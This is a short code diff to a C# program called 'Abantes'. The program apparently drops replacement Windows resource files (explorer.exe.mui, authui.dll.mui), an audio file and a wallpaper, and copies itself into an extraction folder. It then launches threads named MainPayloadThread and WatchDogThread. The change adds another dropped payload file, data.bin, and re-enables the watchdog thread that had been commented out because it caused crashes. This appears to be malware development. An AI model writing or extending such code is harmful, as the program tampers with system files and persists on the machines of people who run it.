@@ -43,6 +43,7 @@ namespace Abantes
                 File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
                 File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
                 File.WriteAllBytes(extractPath + "\\Audio.mp3", Resources.Audio);
+                File.WriteAllBytes(extractPath + "\\data.bin", Resources.data);
                 Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
@@ -238,7 +239,7 @@ namespace Abantes
                 Thread normalThread = new Thread(new ThreadStart(Threads.MainPayloadThread));
                 Thread watchdogThread = new Thread(new ThreadStart(Threads.WatchDogThread));
                 normalThread.Start();
-                watchdogThread.Start(); //cuases crshes
+                watchdogThread.Start();
             }
         }
     }
